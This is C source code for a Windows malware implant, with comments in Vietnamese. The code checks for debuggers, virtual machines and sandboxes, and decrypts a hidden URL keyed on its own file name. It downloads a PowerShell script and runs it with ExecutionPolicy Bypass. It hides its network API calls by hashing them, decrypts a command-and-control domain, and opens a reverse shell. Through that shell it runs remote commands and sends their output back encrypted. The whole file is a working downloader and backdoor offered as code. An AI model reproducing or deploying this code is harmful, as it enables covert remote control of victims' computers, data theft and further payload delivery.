#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <wincrypt.h>
#include <wininet.h>
#include <lmcons.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#define PORT 11736
#define BUFFER_SIZE 4096

BOOL is_debugger_present() {
    return IsDebuggerPresent();
}

BOOL is_running_in_vm() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    return (sysInfo.dwNumberOfProcessors <= 2);  // Heuristic: ít core = VM
}

BOOL is_uptime_suspicious() {
    DWORD uptime = GetTickCount64() / 1000;  // seconds
    return (uptime < 300);  // System vừa khởi động < 5 phút?
}

void suspicious_delay_check() {
    DWORD start = GetTickCount();
    Sleep(5000);  // ngủ 5s
    DWORD elapsed = GetTickCount() - start;

    if (elapsed < 4000) {
        // Nếu sandbox hook Sleep và trả về nhanh
        printf("[!] Sleep was bypassed - possible sandbox detected!\n");
        ExitProcess(1);
    }
}
BOOL DownloadFileFromUrl(const char* url, const char* savePath){
    HINTERNET hInternet = InternetOpen("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("InternetOpen failed: %lu\n", GetLastError());
        return FALSE;
    }

    HINTERNET hFile = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        printf("InternetOpenUrl failed: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    HANDLE hOutput = CreateFileA(savePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOutput == INVALID_HANDLE_VALUE) {
        printf("CreateFile failed: %lu\n", GetLastError());
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    BYTE buffer[4096];
    DWORD bytesRead = 0, bytesWritten = 0;

    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        if (!WriteFile(hOutput, buffer, bytesRead, &bytesWritten, NULL)) {
            printf("WriteFile failed: %lu\n", GetLastError());
            CloseHandle(hOutput);
            InternetCloseHandle(hFile);
            InternetCloseHandle(hInternet);
            return FALSE;
        }
    }

    CloseHandle(hOutput);
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    printf("Download complete: %s\n", savePath);
    return TRUE;
}
BOOL CreateFolder(const char* folderPath) {
    if (CreateDirectoryA(folderPath, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        return TRUE;
    } else {
        return FALSE;
    }
}
const char* GetCurrentUserNameString() {
    static char username[UNLEN + 1];
    DWORD size = UNLEN + 1;

    if (GetUserNameA(username, &size)) {
        return username;
    } else {
        return NULL;
    }
}
typedef int (WINAPI *connect_t)(SOCKET, const struct sockaddr*, int);
typedef SOCKET (WINAPI *socket_t)(int, int, int);
typedef int (WINAPI *send_t)(SOCKET, const char*, int, int);
typedef int (WINAPI *recv_t)(SOCKET, char*, int, int);
typedef int (WINAPI *closesocket_t)(SOCKET);
typedef DWORD (WINAPI *inet_addr_t)(const char*);
DWORD hash_api(const char* name, BYTE* key) {
    size_t key_len = strlen((char*)key);
    DWORD hash = 0x1337BEEF;
    size_t i = 0;
    while (*name) {
        hash ^= *name;
        hash = _rotl(hash, 7);
        hash += key[i % key_len];
        name++;
        i++;
    }
    return hash;
}
BYTE* get_resource_data(DWORD* pSize) {
    HMODULE hModule = GetModuleHandleA(NULL);
    HRSRC hRes = FindResourceA(hModule, "CONFIG", "DATA");
    if (!hRes) return NULL;

    HGLOBAL hResData = LoadResource(hModule, hRes);
    if (!hResData) return NULL;

    DWORD size = SizeofResource(hModule, hRes);
    if (pSize) *pSize = size;

    return (BYTE*)LockResource(hResData);
}
FARPROC resolve_api_by_hash(const char* dll_name, DWORD target_hash, BYTE* key) {
    HMODULE hModule = LoadLibraryA(dll_name);
    if (!hModule) return NULL;

    BYTE* base = (BYTE*)hModule;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)(base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)(base + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)(base + exportDir->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)(base + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* func_name = (char*)(base + names[i]);
        DWORD h = hash_api(func_name, key);
        if (h == target_hash) {
            DWORD func_rva = functions[ordinals[i]];
            return (FARPROC)(base + func_rva);
        }
    }

    return NULL;
}
BOOL rc4_decrypt(BYTE* key, DWORD key_len, BYTE* in, BYTE* out, DWORD data_len) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    DWORD len = data_len;

    struct {
        BLOBHEADER hdr;
        DWORD len;
        BYTE key[256];
    } keyBlob;

    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_RC4;
    keyBlob.len = key_len;
    memcpy(keyBlob.key, key, key_len);

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        return FALSE;

    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(BLOBHEADER) + sizeof(DWORD) + key_len, 0, 0, &hKey)) {
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }

    memcpy(out, in, len);

    if (!CryptDecrypt(hKey, 0, TRUE, 0, out, &len)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }

    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    return TRUE;
}
DWORD base64_decode(char *input, BYTE **output) {
    DWORD out_len = 0;
    DWORD input_len = strlen(input);
    CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &out_len, NULL, NULL);

    *output = (BYTE*)malloc(out_len);
    if (!*output) return 0;

    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, *output, &out_len, NULL, NULL)) {
        free(*output);
        return 0;
    }
    return out_len;
}
DWORD base64_encode(const BYTE* input, DWORD input_len, char** output) {
    DWORD encoded_len = 0;

    // Bước 1: Lấy độ dài chuỗi base64 sau encode
    if (!CryptBinaryToStringA(input, input_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encoded_len)) {
        return 0;
    }

    // Bước 2: Cấp phát bộ nhớ
    *output = (char*)malloc(encoded_len);
    if (!*output) {
        return 0;
    }

    // Bước 3: Thực hiện encode
    if (!CryptBinaryToStringA(input, input_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, *output, &encoded_len)) {
        free(*output);
        *output = NULL;
        return 0;
    }

    return encoded_len;
}

int main() {

    is_debugger_present();
    is_running_in_vm();
    is_uptime_suspicious();
    // Tạo một folder làm việc của malware
    const char* user = GetCurrentUserNameString();
    char folder[MAX_PATH];
    snprintf(folder, sizeof(folder), "C:\\Users\\%s\\AppData\\Local\\Temp\\kAiZ3n", user);
    CreateFolder(folder);
    char filePath[MAX_PATH];
    DWORD lenFileName = GetModuleFileNameA(NULL,filePath, sizeof(filePath));
    if(lenFileName < 0){
        return 1;
    }
    
    BYTE* fileName = (BYTE *)strrchr(filePath,92) + 1;
    BYTE url [114] = {0xc8,0x83,0xbd,0x45,0x49,0xed,0xf1,0x0a,0xb9,0xc1,0x4a,0xb3,0xd3,0xf8,0x66,0x50,0x86,0x9c,0xf5,0x3e,0x5d,0xfb,0x0c,0x67,0x1f,0x6b,0x79,0xe3,0xe7,0xf9,0x9e,0x4f,0x5e,0xa2,0xa3,0x04,0x65,0x8f,0x77,0xab,0x2a,0x93,0x72,0x00,0x7b,0x7b,0xd8,0x02,0xb5,0x60,0x0b,0x8b,0xe9,0x8f,0x04,0x1b,0x29,0xac,0xcb,0x56,0x70,0xdf,0x18,0x52,0xe7,0x11,0x30,0x53,0x13,0x3e,0x46,0x2d,0x88,0x5a,0x86,0x0b,0x97,0x02,0x34,0x5f,0xfe,0x0d,0x45,0xa0,0xcc,0x98,0xbf,0xab,0xee,0xdd,0xc4,0x0a,0xa8,0x6d,0x0f,0x0d,0x1f,0x10,0xf9,0x3c,0x3b,0xde,0xd5,0xd5,0x71,0xbf,0xaa,0x32,0x91,0x99,0xbb,0x71,0x0f,0xee};
    DWORD url_len = 114;
    BYTE decrypted_url[114] = {0};
    printf("%s", fileName);
    DWORD len_fileName = 13;
    if (!rc4_decrypt(fileName, len_fileName, url, decrypted_url, url_len)) {
        return 1;
    }
    char url_str[114] = {0};
    char outfile[MAX_PATH];
    const char* pythonInstaller = "pythonInstaller.ps1";
    snprintf(outfile,sizeof(outfile),"%s\\pythonInstaller.ps1", folder);
    memcpy(url_str, decrypted_url, 114);
    DownloadFileFromUrl(url_str,outfile);
    printf("%s", url_str);
    STARTUPINFOA si1 = { 0 };
    PROCESS_INFORMATION pi1 = { 0 };
    si1.cb = sizeof(si1);
    char commandline[MAX_PATH];
    snprintf(commandline,sizeof(commandline),"powershell.exe -ExecutionPolicy Bypass -File \"%s\"",outfile);
    BOOL success = CreateProcessA(NULL, commandline, NULL, NULL, FALSE, 0, NULL, NULL, &si1, &pi1);
    if (success) {
        CloseHandle(pi1.hProcess);
        CloseHandle(pi1.hThread);
    }



    DWORD key_len = 0;
    BYTE* key = get_resource_data(&key_len);
    if (!key || key_len == 0) {
        return 1;
    }

    DWORD h_socket = 0xF0D2746A;
    DWORD h_connect = 0x195C4F50;
    DWORD h_send = 0xC68505AD;
    DWORD h_recv = 0xD687CCAD;
    DWORD h_close = 0xB07AA821;
    DWORD h_inetaddr = 0x32C79351;

    socket_t my_socket = (socket_t)resolve_api_by_hash("ws2_32.dll", h_socket, key);
    connect_t my_connect = (connect_t)resolve_api_by_hash("ws2_32.dll", h_connect, key);
    send_t my_send = (send_t)resolve_api_by_hash("ws2_32.dll", h_send, key);
    recv_t my_recv = (recv_t)resolve_api_by_hash("ws2_32.dll", h_recv, key);
    closesocket_t my_closesocket = (closesocket_t)resolve_api_by_hash("ws2_32.dll", h_close, key);
    inet_addr_t my_inet_addr = (inet_addr_t)resolve_api_by_hash("ws2_32.dll", h_inetaddr, key);

    if (!my_socket || !my_connect || !my_send || !my_recv || !my_closesocket || !my_inet_addr) {
        return 1;
    }

    WSADATA wsa;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }
    SOCKET s = my_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in srv;
    struct hostent* he;
    char encDomain[25] = "eKUi/sfhXVkfFHzy0nQ=";
    BYTE* dec_base64_domain = NULL;
    DWORD decDomain_len = base64_decode(encDomain, &dec_base64_domain);
    BYTE decrypted_domain[8096] = {0};
    if (!rc4_decrypt(key, key_len, dec_base64_domain, decrypted_domain, decDomain_len)) {
        free(dec_base64_domain);
    }
    printf("%s",decrypted_domain);
    he = gethostbyname((char*)decrypted_domain);
    struct in_addr** addr_list =(struct in_addr**)he->h_addr_list;
    char* ip = inet_ntoa(*addr_list[0]);
    printf("%s",ip);
    srv.sin_family = AF_INET;
    srv.sin_port = htons(PORT);
    srv.sin_addr.s_addr = my_inet_addr(ip);

    if (my_connect(s, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
        my_closesocket(s);
        return 1;
    }

    char buffer[BUFFER_SIZE];
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        int received = my_recv(s, buffer, BUFFER_SIZE - 1, 0);
        if (received <= 0) break;

        buffer[received] = 0;

        if (buffer[0] == 's') {
            Sleep(100);
            continue;
        }

        if (buffer[0] == 'd') {
            char *encoded = NULL;
            if(buffer[1] == 'c'){
                char *encoded = buffer + 2;
                BYTE* decoded_base64 = NULL;
                DWORD decoded_len = base64_decode(encoded, &decoded_base64);
                if (decoded_len == 0) {
                    continue;
                }
            
                BYTE decrypted_payload[8096] = {0};
                if (!rc4_decrypt(key, key_len, decoded_base64, decrypted_payload, decoded_len)) {
                    free(decoded_base64);
                    continue;
                }

                STARTUPINFOA si = { 0 };
                PROCESS_INFORMATION pi = { 0 };
                si.cb = sizeof(si);
                char cmdline[8096] = {0};
                BOOL success = CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
                if (!success) {
                    continue;
                } else {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }

                free(decoded_base64);
                continue;
            }
            else if(buffer[1] == 'd'){
                char *encoded = buffer + 2;
                BYTE* decoded_base64 = NULL;
                DWORD decoded_len = base64_decode(encoded, &decoded_base64);
                if (decoded_len == 0) {
                    continue;
                }
            
                BYTE decrypted_payload[8096] = {0};
                if (!rc4_decrypt(key, key_len, decoded_base64, decrypted_payload, decoded_len)) {
                    free(decoded_base64);
                    continue;
                }
                FILE* pipe = _popen((const char*)decrypted_payload, "r");
                if (!pipe) break;

                char readbuf[BUFFER_SIZE];
                while (fgets(readbuf, sizeof(readbuf), pipe)) {
                    size_t read_len = strlen(readbuf);
                    BYTE encrypted[BUFFER_SIZE] = {0};
                    if (!rc4_decrypt(key, key_len, (BYTE*)readbuf, encrypted, (DWORD)read_len)) {
                    continue;
                    }
                    char* encoded = NULL;
                    DWORD encoded_len = base64_encode(encrypted, (DWORD)read_len, &encoded);

                    if (encoded_len == 0 || !encoded) {
                        continue;
                    }
                    my_send(s, encoded, (int)encoded_len, 0);
                    free(encoded);
                    }
                _pclose(pipe);
            }
        }
        if (strncmp(buffer, "exit", 4) == 0)
            break;
    }

    my_closesocket(s);
    WSACleanup();
    return 0;
}
